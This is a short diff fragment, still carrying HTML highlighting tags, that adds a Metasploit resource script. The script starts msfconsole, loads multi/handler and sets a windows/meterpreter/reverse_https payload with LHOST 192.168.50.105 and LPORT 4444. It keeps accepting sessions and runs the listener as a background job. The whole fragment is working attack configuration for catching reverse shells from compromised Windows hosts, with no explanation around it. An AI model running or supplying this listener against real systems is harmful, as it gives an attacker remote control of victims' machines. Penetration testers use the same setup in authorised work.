@@ -1,0 +1,7 @@
+msfconsole <span class="re5">-r</span> listener.rc
+use multi<span class="sy0">/</span>handler 
+<span class="kw1">set</span> payload windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_https 
+<span class="kw1">set</span> LHOST 192.168.50.105
+<span class="kw1">set</span> LPORT <span class="nu0">4444</span>
+<span class="kw1">set</span> ExitOnSession <span class="kw2">false</span> 
+exploit <span class="re5">-j</span>
